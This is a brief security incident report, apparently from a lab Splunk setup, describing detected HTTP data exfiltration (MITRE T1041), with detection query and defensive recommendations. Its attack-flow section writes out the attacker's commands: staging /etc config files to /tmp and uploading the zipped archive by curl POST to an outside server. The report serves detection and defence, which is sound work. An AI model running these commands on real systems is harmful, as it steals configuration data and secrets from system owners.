Title: Suspicious Data Exfiltration Over HTTP Detected (MITRE T1041)

Date: 2025-06-28
Analyst: lief@siem-server  
Tool: Splunk  
Log Source: /var/log/syslog

---

🔍 Summary:
We identified data exfiltration over HTTP using the `curl` command, which sent a compressed `.zip` archive of config files (`/etc/*.conf`) to an external HTTP server.

---

🧪 Attack Flow:

1. Attacker staged files using:
   find /etc -type f -name "*.conf" -readable -exec cp {} /tmp/exfil/ \;

2. Compressed the folder into `data_loot.zip`.

3. Transmitted to attacker server using:
   curl -X POST -F "file=@data_loot.zip" http://192.168.177.128:8000/upload

---

📌 Detection:

- Splunk query:  
  index=* curl OR "192.168.177.128"

- Additional context:  
  zip, /tmp/exfil, POST HTTP

---

🛡️ Recommendation:

- Block unauthorized outbound HTTP uploads.
- Monitor file movements to staging areas like `/tmp`.
- Set up alerts for tools like `curl` and `scp` in unexpected locations.
